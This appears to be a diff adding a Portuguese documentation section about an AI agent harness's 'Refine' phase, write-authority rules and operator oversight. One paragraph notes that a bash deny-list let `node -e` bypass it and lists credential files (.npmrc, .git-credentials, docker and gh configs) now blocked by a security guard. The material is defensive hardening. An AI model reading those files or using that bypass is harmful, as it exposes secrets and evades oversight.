+`docs/harness/v1.2-context.md`.
+
+---
+
+## 13. Refine e Regras Aprendidas (v1.3)
+
+v1.2 mede o **artefato**; v1.3 mede o **agente**: qual regra escrita foi quebrada, em qual lane, se o
+reviewer consegue citar uma regra, e quanto do rulebook um programa verifica. O write-back de prosa do
+v1.2 morreu — um **registro tipado** o substitui, e o loop fecha na **injeção no dispatch**, não no
+review. Raciocínio completo em `docs/harness/continual-harness.md` e `docs/harness/v1.3-context.md`.
+
+### `/refine` — o que é
+
+O **Refine phase** roda entre o Judge e o `awaiting_confirmation`. O `refiner` (pago, read-only por
+permissão) lê a janela de findings, retorna **no máximo uma proposta por componente por run** e não
+escreve nada. Ele **não tem voto** no veredito: o payload do Judge não contém output do Refine.
+
+- `/refine` — roda a fase: janela de findings → contagens via `harness-findings.mjs --json` → refiner
+  → proposta renderizada no `awaiting_confirmation`.
+- `/refine --note "<o que corrigi à mão>"` — registra um `operator_note` (classe própria, peso
+  `operator_note_weight`); a palavra do operador passa a barra de proposta sozinha — aritmética, não
+  caso especial.
+- Sem evidência nova (sem findings desde o último `refine-log.md`), **não roda**: "no new evidence".
+  Ausência é gap a nomear, nunca run limpo.
+
+### O fluxo one-stop
+
+```
+gate → trailer (incl. Adherence:) → CODE COMMIT → Judge → Refine → awaiting_confirmation
+  → confirmo → prosa como COMMIT SEPARADO do rulebook → próxima run injeta a regra no prompt da lane
+```
+
+**A prosa entra depois do commit de código, e essa ordem é estrutural.** `agent-os/standards/`,
+`docs/review.md`, `learned-rules.json` e `refine-log.md` estão dentro do `sourceHash`; escrever prosa
+antes do trailer estala o report e o `harness-ship-evidence` recusa — aprender com sucesso bloquearia
+o ship. **Não "corrija" isso alargando `GATE_ARTIFACTS`**: tirar o rulebook do hash remove a única
+detecção sobre ele e reproduz o TOCTOU do `**/auth/**` no próprio rulebook.
+
+### Divisão de autoridade de escrita
+
+Dados são escritos; prosa é proposta. Nenhum agente ganha permissão de escrita:
+
+| O quê | Quem produz | Quem escreve | Gate |
+|---|---|---|---|
+| findings tipados | reviewers (`edit: deny`, **`bash: deny`**) | scheduler, write-once por label | nenhum — dado medido |
+| contagens, linhas de aderência | `harness-findings.mjs` | scheduler | nenhum — determinístico |
+| nota do operador | operador, via `/refine --note` | scheduler | nenhum — palavras do próprio operador |
+| proposta de regra | `refiner` (tudo `deny`) | ninguém | — |
+| refutação | `rule-verifier` (mesmo lockdown; dispatch distinto) | ninguém | — |
+| regra **prose + observe** | — | scheduler, se o verifier não refutar, em commit separado | verifier (auto); veto do operador na leitura `high_risk_path` da próxima run |
+| regra **blocking / high_risk_path** | — | scheduler, após confirmação, em commit separado | operador, vendo o TEXTO LITERAL |
+| promoção de enforcement | — | scheduler, após confirmação | operador + um teste que falha antes e passa depois |
+| números governantes | — | operador, em `quality-thresholds.json` | entrada datada em `quality-decisions.md` |
+| qualquer coisa em `~/.config/opencode/` | — | operador, à mão | sempre |
+
+`code-reviewer` foi para `bash: deny` (a deny-list enumerada deixava passar `node -e`), e o `refiner`
+nega `external_directory` e `webfetch` explicitamente — o padrão global do plugin para o primeiro é
+`ask`, e um agente cujo output vira prosa commitada e transmitida a todas as lanes não deve ler fora
+do repo. Em 2026-08-12 (SEC-R4) o princípio foi generalizado: todo agente read-only de
+review/advisory/recon nega `external_directory`; `architecture-reviewer` ficou restrito ao skill
+`improve-codebase-architecture`; `security-analyst` perdeu `webfetch` (revisão defensiva local, sem
+egress geral); e o security guard passou a bloquear também `.npmrc`/`_npmrc`/`npmrc`,
+`.config/gh/hosts.yml`, `.docker/config.json` e `.git-credentials`. `task: deny` no refiner é o que
+impede ele delegar uma escrita a um subagente com escrita.
+
+### A cadência honesta
+
+| Ação | Frequência |
+|---|---|
+| aprovar/recusar proposta (texto literal renderizado) | por run que produza uma, máx. 1 por componente |
+| resolver conflito entre candidato e regra ativa | quando houver |
+| confirmar aposentadoria (janela de citação / cap por target) | quando disparar |
+| **autorar o lint/test da promoção de enforcement** | por regra promovida — o único jeito de `enforced_fraction` subir |
+| setar thresholds do estágio 2 a partir de baselines, com razão datada | uma vez no estágio 2, depois por mudança |
+| `/refine --note` depois de correção manual | quando acontecer |
+| promover regra aos templates globais | raro; precisa de três projetos |
+
+A linha do meio é a que o primeiro rascunho escondeu.
+
+### O que o loop NÃO vê
+
+Adesão conta **violações detectadas**, não reais — um reviewer degradado que acha menos findings lê
+como progresso. Classificação continua julgada por modelo (o script valida o pointer e faz a
+aritmética; o rótulo é do reviewer). A primeira ocorrência de um erro não chega a ninguém (barra
+ponderada de propósito). A regra **permanentemente-prosa** é resultado legítimo, não backlog — e fica
+**estruturalmente fora** do denominador de `enforced_fraction` (o adapter filtra as regras
+`prose_permanent`). O loop **para se o operador parar de aprovar** (as regras
+que podem bloquear), e **intervenção mid-run não é entregue**: o que existe é a halt list do run
+autônomo, `cancel_task` por lane e o fallback serial; `Ctrl+C` não mata filhos em background. Nada de
+**live acceptance** rodou ainda — a tabela C do spec (injeção chegando na lane, findings completos,
+permissões valendo na prática, números de liveness existindo) é trabalho de modelo e está pendente.
+
+Detalhes, invariantes 16–24 e o histórico das duas correções de score:
+`docs/harness/continual-harness.md` e `docs/harness/v1.3-context.md`.
 
 ---
 
